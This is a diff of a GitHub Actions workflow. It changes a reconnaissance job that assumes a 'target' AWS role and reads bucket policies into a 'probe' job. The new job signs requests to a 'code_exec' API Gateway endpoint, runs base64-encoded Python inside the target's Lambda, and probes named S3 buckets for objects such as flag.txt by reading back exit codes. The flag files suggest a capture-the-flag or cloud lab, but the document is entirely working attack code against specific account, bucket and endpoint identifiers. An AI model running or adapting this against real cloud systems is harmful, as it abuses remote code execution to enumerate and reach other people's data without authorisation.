@@ -1,4 +1,4 @@
-name: Stage2
+name: Stage2-Boto3-Probe
 
 on:
   push:
@@ -7,42 +7,108 @@ on:
 
 permissions:
   contents: read
-  id-token: write
 
 jobs:
-  recon:
+  probe:
     runs-on: ubuntu-latest
 
-    steps:
-      - name: Assume target CICD role
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
+      AWS_DEFAULT_REGION: us-east-1
+      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
 
-      - name: Verify account
+    steps:
+      - name: Verify credentials
         run: |
           aws sts get-caller-identity
 
-      - name: Read user bucket policy
-        continue-on-error: true
+      - name: Install dependencies
         run: |
-          aws s3api get-bucket-policy \
-            --bucket userad88e2b168aa387e \
-            --output text
+          python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Read log bucket policy
-        continue-on-error: true
+      - name: Test Lambda boto3 default User-Agent
         run: |
-          aws s3api get-bucket-policy \
-            --bucket logad88e2b168aa387e \
-            --output text
+          python3 - <<'PY'
+          import os
+          import base64
+          import json
+          import requests
+          from requests_aws4auth import AWS4Auth
 
-      - name: Read bucket locations
-        continue-on-error: true
-        run: |
-          aws s3api get-bucket-location \
-            --bucket userad88e2b168aa387e
+          api = os.environ["API_URL"]
 
-          aws s3api get-bucket-location \
-            --bucket logad88e2b168aa387e
+          creds = AWS4Auth(
+              os.environ["AWS_ACCESS_KEY_ID"],
+              os.environ["AWS_SECRET_ACCESS_KEY"],
+              "us-east-1",
+              "execute-api",
+              session_token=os.environ["AWS_SESSION_TOKEN"]
+          )
+
+          def invoke(bucket, key):
+              code = f'''
+          import boto3
+          from botocore.config import Config
+          from botocore.exceptions import ClientError
+
+          bucket = {bucket!r}
+          key = {key!r}
+
+          try:
+              s3 = boto3.client(
+                  "s3",
+                  region_name="us-east-1",
+                  endpoint_url="https://s3.us-east-1.amazonaws.com",
+                  config=Config(
+                      s3={{"addressing_style": "path"}}
+                  )
+              )
+
+              s3.head_object(Bucket=bucket, Key=key)
+              raise SystemExit(7)
+
+          except ClientError as exc:
+              err = exc.response.get("Error", {{}})
+              code = err.get("Code", "")
+
+              if code in ("AccessDenied", "Forbidden", "403"):
+                  raise SystemExit(10)
+
+              if code in ("NoSuchKey", "404", "NotFound"):
+                  raise SystemExit(12)
+
+              raise SystemExit(14)
+
+          except Exception:
+              raise SystemExit(19)
+          '''
+
+              encoded = base64.b64encode(code.encode()).decode()
+
+              response = requests.post(
+                  api,
+                  json={"code": encoded},
+                  auth=creds,
+                  timeout=40
+              )
+
+              print(f"BUCKET={bucket} KEY={key}")
+              print(f"HTTP={response.status_code}")
+              print(response.text)
+              print("---")
+
+          tests = [
+              ("userad88e2b168aa387e", "flag.txt"),
+              ("userad88e2b168aa387e", "index.html"),
+              ("userad88e2b168aa387e", "docs.html"),
+              ("userad88e2b168aa387e", "junior_developer.png"),
+              ("logad88e2b168aa387e", "flag.txt"),
+              ("logad88e2b168aa387e", "index.html"),
+              ("logad88e2b168aa387e", "docs.html"),
+          ]
+
+          for bucket, key in tests:
+              invoke(bucket, key)
+          PY
